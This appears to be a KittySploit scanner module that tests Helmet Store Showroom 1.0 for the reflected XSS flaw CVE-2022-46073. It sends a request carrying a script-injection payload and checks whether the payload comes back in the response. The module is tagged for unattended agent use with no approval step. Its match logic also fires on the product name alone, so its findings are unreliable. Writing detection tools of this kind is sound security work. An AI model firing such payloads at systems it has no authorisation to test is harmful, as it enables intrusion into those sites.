#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Helmet Store Showroom 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Helmet Store Showroom - Cross Site Scripting Detection',
        'description': 'Helmet Store Showroom 1.0 is vulnerable to Cross Site Scripting (XSS).',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'xss', 'helmet-store-showroom', 'helmet_store_showroom_project', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://yuyudhn.github.io/CVE-2022-46073/',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-46073',
            'https://www.youtube.com/watch?v=jT09Uiwl0Jo',
        ],
        'cve': 'CVE-2022-46073',
    }

    def run(self):
        r = self.http_request(method="GET", path='/hss/?q=%27%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('Helmet Store Showroom', '><script>alert(document.domain)</script>',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="Helmet Store Showroom - Cross Site Scripting detected",
                path='/hss/?q=%27%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E',
            )
            return True
        return False

